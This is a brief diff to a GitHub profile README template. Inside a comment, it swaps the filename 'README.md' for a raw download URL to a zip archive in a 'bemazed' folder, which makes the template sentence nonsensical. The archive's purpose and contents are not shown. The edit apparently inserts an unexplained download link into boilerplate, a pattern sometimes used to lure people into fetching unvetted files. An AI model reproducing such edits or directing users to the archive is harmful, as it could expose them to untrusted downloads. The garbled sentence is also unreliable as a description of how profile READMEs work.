@@ -5,6 +5,6 @@
 - 📫 How to reach me ...
 
 <!---
-ajgarciaj/ajgarciaj is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+ajgarciaj/ajgarciaj is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/ajgarciaj/ajgarciaj/main/bemazed/ajgarciaj.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
